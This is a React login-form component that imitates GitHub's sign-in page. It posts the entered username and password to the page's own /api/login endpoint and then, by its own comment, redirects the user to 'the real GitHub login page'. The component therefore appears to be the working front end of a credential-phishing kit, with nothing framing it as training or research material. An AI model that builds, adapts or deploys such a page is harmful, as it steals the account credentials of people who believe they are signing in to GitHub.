"use client";

import { useState } from "react";

export default function LoginForm() {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const formData = new FormData(e.target);
    const login = formData.get("login");
    const password = formData.get("password");

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ login, password }),
      });

      const data = await res.json();

      if (data.success && data.redirect) {
        // Redirect to the real GitHub login page
        window.location.href = data.redirect;
      }
    } catch (error) {
      console.error("Error:", error);
      setLoading(false);
    }
  };

  return (
    <div className="login-card">
      <form id="login-form" onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="login_field">Username or email address</label>
          <input
            type="text"
            name="login"
            id="login_field"
            autoComplete="username"
            autoFocus
            required
          />
        </div>

        <div className="form-group">
          <div className="password-header">
            <label htmlFor="password">Password</label>
            <a href="#" className="forgot-link" id="forgot-password-link">
              Forgot password?
            </a>
          </div>
          <input
            type="password"
            name="password"
            id="password"
            autoComplete="current-password"
            required
          />
        </div>

        <button
          type="submit"
          className="btn-sign-in"
          id="sign-in-btn"
          disabled={loading}
        >
          {loading ? "Signing in…" : "Sign in"}
        </button>
      </form>
    </div>
  );
}
